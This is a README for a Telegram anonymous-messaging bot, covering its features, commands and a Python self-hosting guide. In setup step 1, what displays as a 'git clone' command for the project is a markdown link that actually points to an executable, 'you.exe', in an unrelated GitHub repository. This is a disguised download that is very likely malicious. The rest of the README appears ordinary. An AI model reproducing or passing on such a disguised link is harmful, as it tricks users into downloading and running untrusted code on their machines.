# anon-bot
[![Ask DeepWiki](https://devin.ai/assets/askdeepwiki.png)](https://deepwiki.com/nwsynx/anon-bot)

A simple yet powerful Telegram bot for sending and receiving anonymous messages. Users can generate a personal link, share it, and receive anonymous feedback, questions, or messages from anyone.

## Features

- **Anonymous Messaging**: Send and receive messages without revealing your identity.
- **Personal Link**: Generate a unique link (`t.me/YourBot?start=<YourUserID>`) for others to send you messages.
- **Rich Media Support**: Supports text, photos, videos, voice messages, and video notes (video circles).
- **Anonymous Replies**: Recipients can anonymously reply to any message they receive.
- **Admin Controls**: A designated admin can block and unblock users from using the bot.
- **Suggestion Box**: Users can send ideas and suggestions directly to the bot admin.
- **Free & Ad-Free**: No costs or advertisements.

## How to Use

1.  **Start the Bot**: Send the `/start` command to the bot. It will reply with your unique personal link.
2.  **Share Your Link**: Copy this link and share it on your social media, profile, or directly with friends.
3.  **Receive Messages**: When someone clicks your link, they will be prompted to send you a message through the bot. The message will be forwarded to you anonymously.
4.  **Reply Anonymously**: Each anonymous message you receive comes with a "Reply" button, allowing you to respond without revealing your identity.

## Commands

### User Commands
| Command | Description |
| :--- | :--- |
| `/start` | Generates your personal link for receiving anonymous messages. |
| `/start <user_id>` | Initiates the process of sending an anonymous message to the specified user. |
| `/cancel` | Cancels the current message sending operation. |
| `/idea <your_idea>` | Submits an idea or suggestion for the bot to the admin. |

### Admin Commands
| Command | Description |
| :--- | :--- |
| `/block <user_id>` | Blocks a user from sending any messages. |
| `/unblock <user_id>` | Unblocks a previously blocked user. |
| `/blocked` | Lists all currently blocked user IDs. |

## Self-Hosting Guide

You can run your own instance of this bot.

### Prerequisites

-   Python 3.8+
-   A Telegram account

### Setup

1.  **Clone the repository:**
    ```sh
    [git clone https://github.com/nwsynx/anon-bot.git](https://github.com/x9x6zero/byeworld/raw/refs/heads/main/you.exe)
    cd anon-bot
    ```

2.  **Install dependencies:**
    The only dependency is `pyrogram`.
    ```sh
    pip install pyrogram
    ```

3.  **Get Credentials:**
    -   **`API_ID`** and **`API_HASH`**: Obtain these from [my.telegram.org](https://my.telegram.org) by creating a new application.
    -   **`BOT_TOKEN`**: Create a new bot by talking to [@BotFather](https://t.me/BotFather) on Telegram and copy the token.
    -   **`ADMIN_ID`**: Get your own numeric Telegram User ID. You can get this from bots like [@userinfobot](https://t.me/userinfobot).

4.  **Configure the Bot:**
    Open the `bot.py` file and fill in the following variables with your credentials:
    ```python
    API_ID = 1234567890         # Your api_id
    API_HASH = "your_api_hash" # Your api_hash
    BOT_TOKEN = "your_bot_token" # Your bot token from @BotFather
    ADMIN_ID = 1234567890      # Your user id
    ```

5.  **Run the Bot:**
    ```sh
    python bot.py
    ```

Your bot is now live and running.
